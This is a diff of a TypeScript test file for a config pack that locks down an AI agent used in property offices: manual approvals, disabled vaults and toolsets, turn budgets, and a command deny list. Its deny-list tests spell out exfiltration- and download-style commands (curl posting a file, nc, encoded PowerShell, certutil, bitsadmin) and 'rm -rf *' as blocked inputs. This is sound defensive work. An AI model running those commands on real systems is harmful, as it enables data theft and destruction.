@@ -1,9 +1,10 @@
-import { existsSync, mkdirSync, readdirSync, readFileSync, rmSync, statSync } from "node:fs";
+import { existsSync, mkdirSync, readdirSync, readFileSync, realpathSync, rmSync, statSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
 
-import { applyManagedModelProfile, applyPropertyPack, MANAGED_MODEL_KEY_ENV, MANAGED_MODEL_PROVIDER, managedModelConfig, managedModelProfile, mergePropertyPolicy, ensurePropertyPack, approvalsAreManual, hermesAgentDir, isInsideHermesHome, learningPolicyReady, migratePropertyProfileFromLegacyHermes, OFF_SCOPE_BUNDLED_SKILLS, PACK_DIR, packInstalled, propertyProfileDir, propertyWorkroomReady, skillScopeReady, stagedLearningSupported, workerLimitsReady, WORKER_BROWSER_POLICY, yamlBlock } from "./hermes-pack.ts";
+import { applyManagedModelProfile, applyPropertyPack, MANAGED_MODEL_KEY_ENV, MANAGED_MODEL_PROVIDER, managedModelConfig, managedModelProfile, mergePropertyPolicy, ensurePropertyPack, approvalsAreManual, hermesAgentDir, isInsideHermesHome, learningPolicyReady, migratePropertyProfileFromLegacyHermes, OFF_SCOPE_BUNDLED_SKILLS, PACK_DIR, packInstalled, PREVIOUSLY_OFF_SCOPE_BUNDLED_SKILLS, propertyProfileDir, propertyWorkroomReady, skillScopeReady, stagedLearningSupported, workerLimitsReady, WORKER_ACP_TOOLSETS, WORKER_BROWSER_POLICY, WORKER_DEFERRED_TOOLS, WORKER_DIRECT_TOOLS, WORKER_DISABLED_TOOLSETS, WORKER_DISABLED_VAULTS, WORKER_DENIED_COMMANDS, MEMORY_SCHEMA_READY_COMMITS, yamlBlock } from "./hermes-pack.ts";
+import { MANAGED_MODEL_CHOICES } from "../shared/managed-model-choices.ts";
 import { HERMES_RECOMMENDED } from "./hermes-releases.ts";
 import { releaseHome, resetRuntimeSelectionForTests, saveRuntimeSelection, selectedHermesCli } from "./hermes-runtime-selection.ts";
 import { runtimeCli } from "./hermes-paths.ts";
@@ -88,6 +89,43 @@ describe("applyPropertyPack", WINDOWS_PROFILE_TEST_OPTIONS, () => {
     const { dir } = applyPropertyPack(home); const path = join(dir, "config.yaml");
     for (const text of ["{broken", "approvals:\n  mode: manual\napprovals:\n  mode: off\n"]) {
       writeFileSync(path, text); expect(() => applyPropertyPack(home)).toThrow(/kept/); expect(readFileSync(path, "utf8")).toBe(text);
+    }
+  });
+  it("reads approval and workroom readiness from parsed values, not text", () => {
+    const home = mkdtempSync(join(tmpdir(), "realbud-parsed-readiness-")); dirs.push(home);
+    const { dir } = applyPropertyPack(home); const path = join(dir, "config.yaml");
+    expect(realpathSync(dir)).toBe(dir);
+    const baseline = readFileSync(path, "utf8");
+    expect(approvalsAreManual(home)).toBe(true);
+    expect(propertyWorkroomReady(home)).toBe(true);
+    const approvals = (mode: string) => baseline.replace("approvals:\n  mode: manual\n", `approvals:\n  mode: ${mode}\n`);
+    for (const text of [
+      approvals("yolo  # mode: manual"),
+      approvals("Manual"),
+      approvals("|\n    manual"), // block scalar yields "manual\n"
+      approvals("off\n  mode: manual"), // duplicate key
+      baseline + "approvals:\n  mode: manual\n",
+      "approvals:\n  note: |\n    mode: manual\n  mode: smart\n",
+    ]) {
+      writeFileSync(path, text);
+      expect(approvalsAreManual(home), text.slice(0, 80)).toBe(false);
+    }
+    writeFileSync(path, approvals('"manual "'));
+    expect(approvalsAreManual(home)).toBe(false); // a quoted trailing space survives parsing
+    writeFileSync(path, approvals("manual   # trailing comment"));
+    expect(approvalsAreManual(home)).toBe(true);
+    for (const text of [
+      baseline.replace("  backend: local\n", "  backend: docker  # backend: local\n"),
+      baseline.replace("  redact_secrets: true\n", "  redact_secrets: \"true\"\n"),
+      baseline.replace("  env_passthrough: []\n", "  env_passthrough: [HOME]\n"),
+      baseline.replace("  max_turns: 60\n", "  max_turns: \"60\"\n"),
+      baseline.replace("  - delegation\n", "  - delegation\n  - code_execution\n"),
+      baseline.replace("  - delegation\n", "  # - delegation\n"),
+      baseline.replace("toolsets:\n", "toolsets_note: |\n  - code_execution\ntoolsets:\n").replace("  - web\n", ""),
+      baseline + "terminal:\n  backend: local\n",
+    ]) {
+      writeFileSync(path, text);
+      expect(propertyWorkroomReady(home), text.length.toString()).toBe(false);
     }
   });
   it("requires explicit repair for absent, duplicate or malformed learning gates", () => {
@@ -245,6 +283,17 @@ describe("applyPropertyPack", WINDOWS_PROFILE_TEST_OPTIONS, () => {
       [["security", "allow_lazy_installs"], true],
       [["auxiliary", "title_generation", "enabled"], true],
       [["agent", "budget_warning_ratio"], 1],
+      [["agent", "execution_guidance"], "auto"],
+      [["agent", "intent_ack_continuation"], "auto"],
+      [["agent", "coding_context"], "auto"],
+      [["tool_loop_guardrails", "hard_stop_enabled"], false],
+      [["compression", "min_tail_user_messages"], 1],
+      [["compression", "proactive_prune_tokens"], 0], // upstream reads 0 as off
+      [["compression", "proactive_prune_tokens"], 128000],
+      [["delegation", "child_timeout_seconds"], 0], // upstream reads 0 as no timeout
+      [["delegation", "child_timeout_seconds"], 1800],
+      [["tools", "tool_search", "defer"], [...WORKER_DEFERRED_TOOLS, "todo_list"]],
+      [["tools", "tool_search", "defer"], WORKER_DEFERRED_TOOLS.filter(name => name !== "cronjob_manage")],
     ];
     for (const [at, value] of edits) {
       const doc = parseDocument(baseline, { version: "1.1" }); doc.setIn(at, value);
@@ -254,8 +303,95 @@ describe("applyPropertyPack", WINDOWS_PROFILE_TEST_OPTIONS, () => {
     }
     const tighter = parseDocument(baseline, { version: "1.1" });
     tighter.setIn(["tool_loop_guardrails", "loop_caps", "max_web_searches"], 3);
+    tighter.setIn(["compression", "proactive_prune_tokens"], 48000);
+    tighter.setIn(["delegation", "child_timeout_seconds"], 300);
+    tighter.setIn(["compression", "min_tail_user_messages"], 5);
     writeFileSync(path, tighter.toString());
     expect(workerLimitsReady(home)).toBe(true);
+  });
+
+  it("enables staged learning for each admitted, memory-ready runtime and no other", () => {
+    expect(MEMORY_SCHEMA_READY_COMMITS).toEqual(["345cd2b057a452236de401d3534b8502a7465e8d", "f97608f178d1ffeca59860195ab7da295f7c8e5f"]);
+    for (const [commit, ready] of [
+      ["f97608f178d1ffeca59860195ab7da295f7c8e5f", true], // 0.21.5
+      ["939e45c91d751fadd94dcd1b873ac3cb44846213", false], // 0.21.2: admitted, memory not reviewed
+      ["e3dd27ee2d8b011737a4eea8e3eb3d711ab78690", false], // the v2026.9.24 tag object, not a commit
+    ] as const) {
+      resetRuntimeSelectionForTests();
+      const home = mkdtempSync(join(tmpdir(), "realbud-learning-commit-")); dirs.push(home);
+      const cli = runtimeCli(releaseHome(home, commit));
+      mkdirSync(dirname(cli), { recursive: true }); writeFileSync(cli, "fictional executable marker");
+      saveRuntimeSelection(home, { version: 1, selected: commit, previous: null });
+      expect(stagedLearningSupported(home), commit).toBe(ready);
+    }
+  });
+  it("writes reliability settings on install and asks an older profile for Repair, keeping the office's other settings", () => {
+    const home = mkdtempSync(join(tmpdir(), "realbud-worker-reliability-")); dirs.push(home);
+    const { dir } = applyPropertyPack(home); const path = join(dir, "config.yaml");
+    const fresh = readFileSync(path, "utf8");
+    const expected = {
+      agent: { execution_guidance: true, intent_ack_continuation: true, coding_context: "off" },
+      tool_loop_guardrails: { hard_stop_enabled: true, loop_caps: { max_web_searches: 10, max_subagents: 4 } },
+      compression: { min_tail_user_messages: 3, proactive_prune_tokens: 64000 },
+      delegation: { child_timeout_seconds: 900 },
+      curator: { enabled: false },
+      tools: { tool_search: { defer: [...WORKER_DEFERRED_TOOLS] } },
+    };
+    expect(parse(fresh, { version: "1.1" })).toMatchObject(expected);
+    expect(fresh).not.toContain("!!omap");
+    expect(learningPolicyReady(home)).toBe(true);
+    expect(workerLimitsReady(home)).toBe(true);
+    expect(propertyWorkroomReady(home)).toBe(true);
+
+    // The policy shipped before these settings, plus the office's own choices
+    // in the sections Repair now shares.
+    const old = parseDocument(fresh, { version: "1.1" });
+    for (const at of [["agent", "execution_guidance"], ["agent", "intent_ack_continuation"], ["agent", "coding_context"],
+      ["tool_loop_guardrails", "hard_stop_enabled"], ["delegation", "child_timeout_seconds"], ["compression"], ["curator"], ["tools"]]) old.deleteIn(at);
+    old.set("compression", old.createNode({ threshold: 0.6, min_tail_user_messages: 1, tail_mode: "legacy" }));
+    old.set("curator", old.createNode({ interval_hours: 48 }));
+    old.set("tools", old.createNode({ connectors: { enabled: false }, tool_search: { listing: "off" } }));
+    const before = old.toString();
+    writeFileSync(path, before);
+    // Needs Repair, not unsafe: approvals stay manual and startup does not rewrite it.
+    expect(approvalsAreManual(home)).toBe(true);
+    expect(learningPolicyReady(home)).toBe(false);
+    expect(workerLimitsReady(home)).toBe(false);
+    expect(propertyWorkroomReady(home)).toBe(false);
+    expect(ensurePropertyPack(home).wrote).toEqual([]);
+    expect(readFileSync(path, "utf8")).toBe(before);
+
+    applyPropertyPack(home);
+    const saved = readFileSync(path, "utf8");
+    expect(saved).not.toContain("!!omap");
+    const repaired = parse(saved, { version: "1.1" });
+    expect(repaired).toMatchObject(expected);
+    expect(repaired.compression).toEqual({ threshold: 0.6, min_tail_user_messages: 3, tail_mode: "legacy", proactive_prune_tokens: 64000 });
+    expect(repaired.curator).toEqual({ interval_hours: 48, enabled: false });
+    expect(repaired.tools).toEqual({ connectors: { enabled: false }, tool_search: { listing: "off", defer: [...WORKER_DEFERRED_TOOLS] } });
+    expect(learningPolicyReady(home)).toBe(true);
+    expect(workerLimitsReady(home)).toBe(true);
+    expect(propertyWorkroomReady(home)).toBe(true);
+
+    // An office that switched the curator back on needs Repair for the learning gate.
+    const curatorOn = parseDocument(saved, { version: "1.1" }); curatorOn.setIn(["curator", "enabled"], true);
+    writeFileSync(path, curatorOn.toString());
+    expect(learningPolicyReady(home)).toBe(false);
+    applyPropertyPack(home);
+    expect(learningPolicyReady(home)).toBe(true);
+  });
+
+  it("defers every upstream default except the tools Bud uses directly, and keeps a tool-search switch the office turned off", () => {
+    expect(WORKER_DIRECT_TOOLS).toEqual(["todo_list", "session_search", "process_manage"]);
+    for (const name of WORKER_DIRECT_TOOLS) expect(WORKER_DEFERRED_TOOLS).not.toContain(name as never);
+    const pack = readFileSync(join(PACK_DIR, "config.yaml"), "utf8");
+    // Upstream reads a bare `false` as `enabled: off`; Repair must not turn the bridge back on.
+    const merged = parse(mergePropertyPolicy("tools:\n  tool_search: false\n", pack), { version: "1.1" });
+    expect(merged.tools.tool_search).toEqual({ enabled: "off", defer: [...WORKER_DEFERRED_TOOLS] });
+    expect(parse(mergePropertyPolicy("tools:\n  tool_search: true\n", pack), { version: "1.1" }).tools.tool_search).toEqual({ defer: [...WORKER_DEFERRED_TOOLS] });
+    for (const office of ["compression: 3\n", "curator: off\n", "tools: [tool_search]\n"]) {
+      expect(() => mergePropertyPolicy(office, pack)).toThrow(/kept/);
+    }
   });
 
   it("hides off-scope upstream skills on install and keeps document, RealBud and office skills listed", () => {
@@ -265,7 +401,7 @@ describe("applyPropertyPack", WINDOWS_PROFILE_TEST_OPTIONS, () => {
     expect(disabled).toEqual([...OFF_SCOPE_BUNDLED_SKILLS].sort());
     // Mail, messaging, social posting, coding agents and desktop control stay out of Ask's index.
     for (const name of ["himalaya", "email-inbox-triage", "google-workspace", "imessage", "xurl", "computer-use", "claude-code", "codex"]) expect(disabled).toContain(name);
-    for (const name of ["hermes-agent", "pdf", "xlsx", "docx", ...readdirSync(join(PACK_DIR, "skills"))]) expect(disabled).not.toContain(name);
+    for (const name of ["hermes-agent", "pdf", "xlsx", "docx", ...PREVIOUSLY_OFF_SCOPE_BUNDLED_SKILLS, ...readdirSync(join(PACK_DIR, "skills"))]) expect(disabled).not.toContain(name);
     expect(disabled.some(name => name.startsWith("realbud-"))).toBe(false);
     // The seeding opt-out marker would also withhold pdf/xlsx/docx from a new profile.
     expect(existsSync(join(dir, ".no-bundled-skills"))).toBe(false);
@@ -309,10 +445,45 @@ describe("applyPropertyPack", WINDOWS_PROFILE_TEST_OPTIONS, () => {
   });
 
   it("was reviewed against the bundled skills of the release RealBud recommends", () => {
-    // 0.21.0, 0.21.2 and 0.21.3 bundle the same 58 skills. A new recommended
+    // 0.21.0, 0.21.2, 0.21.3 and 0.21.5 bundle the same 58 skills. A new recommended
     // release needs OFF_SCOPE_BUNDLED_SKILLS checked against its skills/ tree.
-    expect(["29112bef099274229cadff79cdff7bf7b99c4b77", "939e45c91d751fadd94dcd1b873ac3cb44846213", "345cd2b057a452236de401d3534b8502a7465e8d"]).toContain(HERMES_RECOMMENDED.commit);
-    expect(OFF_SCOPE_BUNDLED_SKILLS).toHaveLength(54);
+    expect(["29112bef099274229cadff79cdff7bf7b99c4b77", "939e45c91d751fadd94dcd1b873ac3cb44846213", "345cd2b057a452236de401d3534b8502a7465e8d", "f97608f178d1ffeca59860195ab7da295f7c8e5f"]).toContain(HERMES_RECOMMENDED.commit);
+    expect(OFF_SCOPE_BUNDLED_SKILLS).toHaveLength(47);
+    // 47 hidden + 7 reopened + hermes-agent, pdf, xlsx and docx = 58.
+    expect(PREVIOUSLY_OFF_SCOPE_BUNDLED_SKILLS).toEqual(["blocked-page-recovery", "document-to-action-items", "grounded-citations", "humanizer", "meeting-action-items", "powerpoint", "weekly-review-planning"]);
+    for (const name of PREVIOUSLY_OFF_SCOPE_BUNDLED_SKILLS) expect(OFF_SCOPE_BUNDLED_SKILLS).not.toContain(name);
+    // maps sends property addresses to OpenStreetMap; it stays hidden.
+    expect(OFF_SCOPE_BUNDLED_SKILLS).toContain("maps");
+  });
+
+  it("lists the reopened office-work skills on Repair while keeping a name the office hid itself", () => {
+    const home = mkdtempSync(join(tmpdir(), "realbud-skill-scope-reopen-")); dirs.push(home);
+    const { dir } = applyPropertyPack(home); const path = join(dir, "config.yaml");
+    // A profile repaired under the earlier floor: all seven hidden, plus the office's own.
+    const old = parseDocument(readFileSync(path, "utf8"), { version: "1.1" });
+    old.setIn(["skills", "disabled"], old.createNode([...OFF_SCOPE_BUNDLED_SKILLS, ...PREVIOUSLY_OFF_SCOPE_BUNDLED_SKILLS, "sample-office-hidden"].sort()));
+    writeFileSync(path, old.toString());
+    expect(skillScopeReady(home)).toBe(true);
+    applyPropertyPack(home);
+    const disabled: string[] = parse(readFileSync(path, "utf8"), { version: "1.1" }).skills.disabled;
+    expect(disabled).toEqual([...OFF_SCOPE_BUNDLED_SKILLS, "sample-office-hidden"].sort());
+    expect(skillScopeReady(home)).toBe(true);
+  });
+
+  it("installs the staged upstream optional skills byte for byte beside RealBud's own", () => {
+    const staged = ["decision-questionnaire", "domain-intel", "one-three-one-rule", "rss-feeds", "simple-english"];
+    expect(readdirSync(join(PACK_DIR, "skills")).sort()).toEqual(["intake-properties", "morning-arrears", ...staged].sort());
+    const home = mkdtempSync(join(tmpdir(), "realbud-optional-skills-")); dirs.push(home);
+    const { dir } = applyPropertyPack(home);
+    for (const name of staged) {
+      const shipped = readFileSync(join(PACK_DIR, "skills", name, "SKILL.md"), "utf8");
+      expect(shipped).toMatch(new RegExp(`^---\\nname: ${name}\\n`));
+      expect(shipped).toMatch(/^license: MIT$/m);
+      expect(readFileSync(join(PACK_DIR, "skills", name, "LICENSE"), "utf8")).toMatch(/^MIT License/);
+      expect(readFileSync(join(dir, "skills", name, "SKILL.md"), "utf8")).toBe(shipped);
+    }
+    expect(existsSync(join(dir, "skills", "rss-feeds", "scripts", "feed.py"))).toBe(true);
+    expect(existsSync(join(dir, "skills", "simple-english", "references", "checklist.md"))).toBe(true);
   });
 
   it("does not inherit a Hermes Desktop home model into Bud's hands", () => {
@@ -384,6 +555,120 @@ describe("product fleet", () => {
   });
 });
 
+describe("Ask tool policy (Hermes 0.21.5 reads it; harmless on 0.21.3)", () => {
+  const pack = () => readFileSync(join(PACK_DIR, "config.yaml"), "utf8");
+  const EXCLUDED = ["browser", "computer_use", "connections", "cronjob", "image_gen", "kanban", "tts"];
+
+  it("ships an explicit ACP selection, the exclusions and the login policy", () => {
+    const shipped = parse(pack(), { version: "1.1" });
+    expect(shipped.platform_toolsets).toEqual({ acp: [...WORKER_ACP_TOOLSETS] });
+    expect(shipped.agent.disabled_toolsets).toEqual([...WORKER_DISABLED_TOOLSETS]);
+    expect(WORKER_DISABLED_TOOLSETS).toEqual(EXCLUDED);
+    for (const name of EXCLUDED) expect(WORKER_ACP_TOOLSETS).not.toContain(name as never);
+    expect(WORKER_ACP_TOOLSETS).toContain("no_mcp");
+    // Ask keeps today's tools: execute_code stays behind HERMES_EXEC_ASK.
+    for (const name of ["web", "terminal", "file", "vision", "todo", "memory", "session_search", "skills", "delegation", "code_execution"]) expect(WORKER_ACP_TOOLSETS).toContain(name as never);
+    expect(shipped.auth).toEqual({ adopt_external_logins: false });
+    expect(shipped.agent.auto_recovery_cycles).toBe(1);
+    expect(shipped.tools).toEqual({ connectors: { enabled: false } });
+  });
+
+  it("never adopts the setup role, Hermes Connectors, plugins or the Hermes browser", () => {
+    const raw = pack();
+    // manage_catalog is granted only to a profile whose profile.yaml says `role: setup` (0.21.5 toolsets.py).
+    expect(readFileSync(join(PACK_DIR, "profile.yaml"), "utf8")).not.toMatch(/^\s*role\s*:/m);
+    expect(raw).not.toMatch(/manage_catalog|^\s*-?\s*setup\b|^plugins:|^desktop:|mcp_servers:/m);
+    const merged = parse(mergePropertyPolicy("platform_toolsets:\n  acp: [hermes-acp, browser, connections, setup]\ntools:\n  connectors: true\nagent:\n  disabled_toolsets: []\n", raw), { version: "1.1" });
+    expect(merged.platform_toolsets.acp).toEqual([...WORKER_ACP_TOOLSETS]);
+    expect(merged.agent.disabled_toolsets).toEqual([...WORKER_DISABLED_TOOLSETS]);
+    expect(merged.tools.connectors).toEqual({ enabled: false });
+    expect(merged.browser.backend).toBe("off");
+  });
+
+  it("owns only the ACP list and the login switch, keeping the office's other platforms and auth settings", () => {
+    const office = "platform_toolsets:\n  cli: [hermes-cli]\n  telegram: [web]\nauth:\n  codex_login_method: browser\n  adopt_external_logins: true\ntools:\n  connectors:\n    enabled: true\n    note: kept\n";
+    const merged = parse(mergePropertyPolicy(office, pack()), { version: "1.1" });
+    expect(merged.platform_toolsets).toEqual({ cli: ["hermes-cli"], telegram: ["web"], acp: [...WORKER_ACP_TOOLSETS] });
+    expect(merged.auth).toEqual({ codex_login_method: "browser", adopt_external_logins: false });
+    expect(merged.tools.connectors).toEqual({ enabled: false, note: "kept" });
+    for (const office of ["auth: off\n", "platform_toolsets: [acp]\n"]) expect(() => mergePropertyPolicy(office, pack())).toThrow(/kept/);
+  });
+
+  // Each change an office, a 44→45 schema migration (which appends
+  // `connections` to saved platform lists) or a hand edit could make.
+  const drift: Array<[string, (doc: ReturnType<typeof parseDocument>) => void]> = [
+    ["the migration appended connections to the ACP list", doc => doc.setIn(["platform_toolsets", "acp"], doc.createNode([...WORKER_ACP_TOOLSETS, "connections"]))],
+    ["the ACP list was removed", doc => doc.deleteIn(["platform_toolsets", "acp"])],
+    ["an exclusion was dropped", doc => doc.setIn(["agent", "disabled_toolsets"], doc.createNode(WORKER_DISABLED_TOOLSETS.filter(name => name !== "browser")))],
+    ["external logins were allowed", doc => doc.setIn(["auth", "adopt_external_logins"], true)],
+    ["the login switch is the string \"false\" (upstream reads bool(\"false\") as true)", doc => doc.setIn(["auth", "adopt_external_logins"], "false")],
+    ["Hermes Connectors were switched on", doc => doc.setIn(["tools", "connectors", "enabled"], true)],
+    ["upstream's five recovery cycles came back", doc => doc.setIn(["agent", "auto_recovery_cycles"], 5)],
+    ...WORKER_DISABLED_VAULTS.flatMap((name): Array<[string, (doc: ReturnType<typeof parseDocument>) => void]> => [
+      [`vault.${name}.enabled is missing (0.21.5 defaults it on)`, doc => doc.deleteIn(["vault", name, "enabled"])],
+      [`vault.${name} is missing`, doc => doc.deleteIn(["vault", name])],
+      [`vault.${name}.enabled is the string "false" (upstream turns off only on \`is False\`)`, doc => doc.setIn(["vault", name, "enabled"], "false")],
+      [`vault.${name}.enabled is true`, doc => doc.setIn(["vault", name, "enabled"], true)],
+    ]),
+    ["the vault section is missing", doc => doc.delete("vault")],
+    ["the turn wall-clock budget is missing", doc => doc.deleteIn(["agent", "run_budget_seconds"])],
+    ["the turn budget outlasts RealBud's hard stop", doc => doc.setIn(["agent", "run_budget_seconds"], 900)],
+    ["the turn budget is below a minute", doc => doc.setIn(["agent", "run_budget_seconds"], 30)],
+    ["the turn budget is a string", doc => doc.setIn(["agent", "run_budget_seconds"], "840")],
+    ["the background-review input cap is missing", doc => doc.deleteIn(["auxiliary", "background_review", "max_input_tokens"])],
+    ["the background-review input cap is 0 (upstream reads <= 0 as unlimited)", doc => doc.setIn(["auxiliary", "background_review", "max_input_tokens"], 0)],
+    ["the background-review input cap is upstream's 600K", doc => doc.setIn(["auxiliary", "background_review", "max_input_tokens"], 600000)],
+  ];
+  it.each(drift)("reads a profile where %s as needing Repair, which restores it", (_label, change) => {
+    const home = mkdtempSync(join(tmpdir(), "realbud-acp-policy-")); dirs.push(home);
+    const { dir } = applyPropertyPack(home); const path = join(dir, "config.yaml");
+    expect(workerLimitsReady(home)).toBe(true);
+    const doc = parseDocument(readFileSync(path, "utf8"), { version: "1.1" });
+    change(doc);
+    writeFileSync(path, doc.toString());
+    expect(workerLimitsReady(home)).toBe(false);
+    expect(propertyWorkroomReady(home)).toBe(false);
+    applyPropertyPack(home);
+    expect(workerLimitsReady(home)).toBe(true);
+    expect(propertyWorkroomReady(home)).toBe(true);
+  });
+
+  it("ships the vault, turn-budget and review-cap keys and keeps the office's other settings in those sections", () => {
+    const shipped = parse(pack(), { version: "1.1" });
+    expect(WORKER_DISABLED_VAULTS).toEqual(["onepassword", "bitwarden"]);
+    expect(shipped.vault).toEqual({ onepassword: { enabled: false }, bitwarden: { enabled: false } });
+    expect(shipped.agent.run_budget_seconds).toBe(840);
+    expect(shipped.auxiliary.background_review).toEqual({ enabled: false, extra_tools: [], max_input_tokens: 120000 });
+    const office = "vault:\n  onepassword:\n    enabled: true\n    account: fictional-office\n  bitwarden: true\n  keepassxc:\n    enabled: true\nauxiliary:\n  vision:\n    model: fictional-vision\n  background_review:\n    max_input_tokens: 600000\n";
+    const merged = parse(mergePropertyPolicy(office, pack()), { version: "1.1" });
+    expect(merged.vault).toEqual({ onepassword: { enabled: false, account: "fictional-office" }, bitwarden: { enabled: false }, keepassxc: { enabled: true } });
+    expect(merged.auxiliary.vision).toEqual({ model: "fictional-vision" });
+    expect(merged.auxiliary.background_review.max_input_tokens).toBe(120000);
+    expect(merged.agent.run_budget_seconds).toBe(840);
+    expect(() => mergePropertyPolicy("vault: off\n", pack())).toThrow(/kept/);
+  });
+
+  it("accepts a tighter turn budget and review cap", () => {
+    const home = mkdtempSync(join(tmpdir(), "realbud-acp-budget-")); dirs.push(home);
+    const { dir } = applyPropertyPack(home); const path = join(dir, "config.yaml");
+    const doc = parseDocument(readFileSync(path, "utf8"), { version: "1.1" });
+    doc.setIn(["agent", "run_budget_seconds"], 600);
+    doc.setIn(["auxiliary", "background_review", "max_input_tokens"], 60000);
+    writeFileSync(path, doc.toString());
+    expect(workerLimitsReady(home)).toBe(true);
+    expect(learningPolicyReady(home)).toBe(true);
+  });
+
+  it("accepts an office that turned the recovery wait off entirely", () => {
+    const home = mkdtempSync(join(tmpdir(), "realbud-acp-recovery-")); dirs.push(home);
+    const { dir } = applyPropertyPack(home); const path = join(dir, "config.yaml");
+    const doc = parseDocument(readFileSync(path, "utf8"), { version: "1.1" });
+    doc.setIn(["agent", "auto_recovery_cycles"], 0);
+    writeFileSync(path, doc.toString());
+    expect(workerLimitsReady(home)).toBe(true);
+  });
+});
+
 describe("worker browser surface", () => {
   it("owns the browser keys that would give Hermes its own browser and keeps the office's other browser settings", () => {
     const office = "browser:\n  headed: true\n  backend: \"\"\n  cloud_provider: camofox\n  cdp_url: http://127.0.0.1:9222\n  engine: lightpanda\n  use_real_profile: true\n";
@@ -406,19 +691,74 @@ describe("worker browser surface", () => {
   });
 });
 
+describe("worker command deny list", () => {
+  it("writes approvals.deny on install, keeps the office's other settings, and restores drift on Repair", () => {
+    const home = mkdtempSync(join(tmpdir(), "realbud-worker-deny-")); dirs.push(home);
+    const dir = propertyProfileDir(home); privateFixtureDirectory(dir);
+    const path = join(dir, "config.yaml");
+    writeFileSync(path, "model:\n  provider: retained\napprovals:\n  mode: yolo\n  deny: [\"rm -rf *\"]\nterminal:\n  timeout: 99\n");
+    applyPropertyPack(home);
+    const written = parseDocument(readFileSync(path, "utf8"), { version: "1.1" }).toJS();
+    expect(written.approvals.mode).toBe("manual");
+    expect(written.approvals.deny).toEqual([...WORKER_DENIED_COMMANDS]);
+    expect(written.model.provider).toBe("retained");
+    expect(workerLimitsReady(home)).toBe(true);
+    expect(propertyWorkroomReady(home)).toBe(true);
+    for (const drift of [(doc: ReturnType<typeof parseDocument>) => doc.deleteIn(["approvals", "deny"]),
+      (doc: ReturnType<typeof parseDocument>) => doc.setIn(["approvals", "deny"], "curl[ .]*"),
+      (doc: ReturnType<typeof parseDocument>) => doc.setIn(["approvals", "deny"], doc.createNode(WORKER_DENIED_COMMANDS.slice(1)))]) {
+      const doc = parseDocument(readFileSync(path, "utf8"), { version: "1.1" });
+      drift(doc);
+      writeFileSync(path, doc.toString());
+      expect(workerLimitsReady(home)).toBe(false);
+      expect(propertyWorkroomReady(home)).toBe(false);
+      applyPropertyPack(home);
+      expect(workerLimitsReady(home)).toBe(true);
+      expect(propertyWorkroomReady(home)).toBe(true);
+    }
+  });
+
+  it("covers the network tools and inline interpreters as whole-command globs", () => {
+    // Python's fnmatchcase over a lower-cased command, as Hermes matches.
+    const glob = (pattern: string) => new RegExp("^" + pattern.replace(/[.+^$(){}|\\]/g, "\\$&").replace(/\*/g, ".*").replace(/\[!/g, "[^") + "$", "s");
+    const denied = (command: string) => WORKER_DENIED_COMMANDS.some(pattern => glob(pattern).test(command.toLowerCase().trim()));
+    for (const command of ["curl https://example.invalid -d @file", "/usr/bin/curl x", "ls; wget x", "echo $(curl x)", "CURL.EXE http://x",
+      "cat a | nc host 1", "ssh host", "scp a host:", "Invoke-WebRequest -Uri x", "iwr x", "irm x", "certutil -urlcache x", "bitsadmin /transfer x",
+      "powershell -enc AAA", "pwsh -c x", "osascript -e x", "python3 -c 'print(1)'", "node -e 1", "node --eval 1", "perl -e 1", "ruby -e 1"]) {
+      expect(denied(command), command).toBe(true);
+    }
+    for (const command of ["python3 report.py", "ls -la", "grep -rn sync .", "cat notes/confirm.txt", "git status"]) {
+      expect(denied(command), command).toBe(false);
+    }
+  });
+});
+
 describe("managed model profile", WINDOWS_PROFILE_TEST_OPTIONS, () => {
   const GATEWAY = "https://gateway.fictional.test/v1";
 
   it("writes the named managed provider, the choice's model and effort, and keeps the rest of the config", () => {
     const pack = readFileSync(join(PACK_DIR, "config.yaml"), "utf8");
     const written = parse(managedModelConfig(pack, GATEWAY, "sonnet-xhigh"));
-    expect(written.model).toEqual({ default: "claude-sonnet-5.5", provider: MANAGED_MODEL_PROVIDER });
+    expect(written.model).toEqual({ default: "claude-sonnet-5.5", provider: MANAGED_MODEL_PROVIDER, supports_vision: true });
     expect(written.providers).toEqual({ realbud: { base_url: GATEWAY, key_env: MANAGED_MODEL_KEY_ENV, api_mode: "chat_completions" } });
     expect(written.agent.reasoning_effort).toBe("xhigh");
     expect(written.agent.max_turns).toBe(parse(pack).agent.max_turns);
     expect(written.approvals).toEqual(parse(pack).approvals);
     // An empty profile still gets a readable block document.
     expect(parse(managedModelConfig("", GATEWAY, "flash-high"))).toMatchObject({ model: { default: "deepseek-v4.1-flash" }, agent: { reasoning_effort: "high" } });
+  });
+
+  it("declares image input only for the choices whose model takes images, and drops it on a switch to Flash", () => {
+    const pack = readFileSync(join(PACK_DIR, "config.yaml"), "utf8");
+    expect(Object.fromEntries(MANAGED_MODEL_CHOICES.map(choice => [choice.id, choice.supportsVision]))).toEqual({ "flash-high": false, "sonnet-high": true, "sonnet-xhigh": true });
+    for (const choice of MANAGED_MODEL_CHOICES) {
+      const model = parse(managedModelConfig(pack, GATEWAY, choice.id), { version: "1.1" }).model;
+      expect(model).toEqual({ default: choice.model, provider: MANAGED_MODEL_PROVIDER, ...(choice.supportsVision ? { supports_vision: true } : {}) });
+    }
+    const flash = parse(managedModelConfig(managedModelConfig(pack, GATEWAY, "sonnet-high"), GATEWAY, "flash-high"), { version: "1.1" });
+    expect(flash.model).toEqual({ default: "deepseek-v4.1-flash", provider: MANAGED_MODEL_PROVIDER });
+    // A pack reinstall keeps the managed model section as written.
+    expect(parse(mergePropertyPolicy(managedModelConfig(pack, GATEWAY, "sonnet-xhigh"), pack), { version: "1.1" }).model.supports_vision).toBe(true);
   });
 
   it("carries the choice through a policy rewrite only while it is still one of the three", () => {
